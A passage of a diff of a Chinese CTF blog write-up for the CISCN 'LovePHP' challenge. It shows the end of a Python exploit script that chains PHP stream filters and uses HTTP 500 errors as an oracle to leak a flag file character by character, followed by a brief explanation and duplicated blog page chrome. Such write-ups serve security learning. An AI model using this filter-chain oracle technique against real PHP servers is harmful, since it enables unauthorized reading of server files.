+				letter <span class="token operator">=</span> <span class="token string">'6'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'yz*'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'7'</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> s <span class="token operator">==</span> <span class="token string">'O'</span><span class="token punctuation">:</span>
+			<span class="token comment"># 8 - 9</span>
+			prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
+			ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'8'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'9'</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'wtf'</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">=</span>letter<span class="token punctuation">)</span>
+	o <span class="token operator">+=</span> letter
+	sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">"""
+We are done!! :)
+"""</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>o<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'='</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>
+<span class="token comment"># remove KR padding</span>
+d <span class="token operator">=</span> d<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'$)C'</span><span class="token punctuation">,</span><span class="token string">b''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>  首先，通过构造特定的过滤器链，在HTTP请求中注入不同的字符和过滤器</p>
 </li>
 <li><p>  如果在应用过滤器链后服务器返回500错误，那么可以推断出该字符在flag文件中，因为服务器在某些条件下无法正确处理该输入，从而导致错误</p>
@@ -595,7 +592,7 @@
 <li><p>  根据服务器的响应，可以逐个判断flag文件中的字符</p>
 </li>
 </ol>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/LovePHP/">http://dezhoutorizhao.github.io/LovePHP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">数据结构</div></div></a></div><div class="next-post pull-right"><a href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/" title="通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师，研究多线程高并发、分布式计算、渗透测试、Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看他学了什么新技术吧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ciscn%E5%88%9D%E8%B5%9B%E2%80%94%E2%80%94LovePHP%E9%A2%98%E7%9B%AEwp"><span class="toc-number">1.</span> <span class="toc-text">Ciscn初赛——LovePHP题目wp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Docker+K8s/" title="云原生实战-Docker+K8s">云原生实战-Docker+K8s</a><time datetime="2024-04-10T12:40:41.235Z" title="发表于 2024-04-10 20:40:41">2024-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/" title="计算机网络复习">计算机网络复习</a><time datetime="2024-04-01T12:39:28.311Z" title="发表于 2024-04-01 20:39:28">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Metasploit%E5%AE%9E%E6%88%98/" title="Metasploit实战">Metasploit实战</a><time datetime="2024-03-19T08:19:14.901Z" title="发表于 2024-03-19 16:19:14">2024-03-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">成功的秘诀在于兴趣</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/LovePHP/">http://dezhoutorizhao.github.io/LovePHP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">数据结构</div></div></a></div><div class="next-post pull-right"><a href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/" title="通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师，研究多线程高并发、分布式计算、渗透测试、Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看他学了什么新技术吧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ciscn%E5%88%9D%E8%B5%9B%E2%80%94%E2%80%94LovePHP%E9%A2%98%E7%9B%AEwp"><span class="toc-number">1.</span> <span class="toc-text">Ciscn初赛——LovePHP题目wp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Docker+K8s/" title="云原生实战-Docker+K8s">云原生实战-Docker+K8s</a><time datetime="2024-04-10T12:40:41.235Z" title="发表于 2024-04-10 20:40:41">2024-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/" title="计算机网络复习">计算机网络复习</a><time datetime="2024-04-01T12:39:28.311Z" title="发表于 2024-04-01 20:39:28">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Metasploit%E5%AE%9E%E6%88%98/" title="Metasploit实战">Metasploit实战</a><time datetime="2024-03-19T08:19:14.901Z" title="发表于 2024-03-19 16:19:14">2024-03-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">成功的秘诀在于兴趣</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
 
 var pjax = new Pjax({
   elements: 'a:not([target="_blank"])',
